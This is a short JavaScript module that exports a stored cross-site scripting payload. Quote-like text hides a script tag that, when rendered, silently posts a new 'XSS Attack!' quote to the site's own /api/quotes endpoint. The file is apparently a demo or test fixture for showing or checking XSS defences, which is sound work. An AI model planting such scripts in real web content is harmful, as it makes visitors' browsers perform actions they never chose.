export const XSS_SCRIPT = `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.
<script>
  fetch("/api/quotes", {
      method: "POST",
      body: JSON.stringify({
        bgColor: "bg-purple-600",
        name: "XSS",
        quote: "XSS Attack! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad aliquid aperiam beatae corporis delectus, dolorum inventore nihil quas quod rem sapiente suscipit velit! Commodi, cupiditate ipsa itaque magnam maxime quam?",
      }),
    }).then((res) => console.log(res.json()));
</script>`;
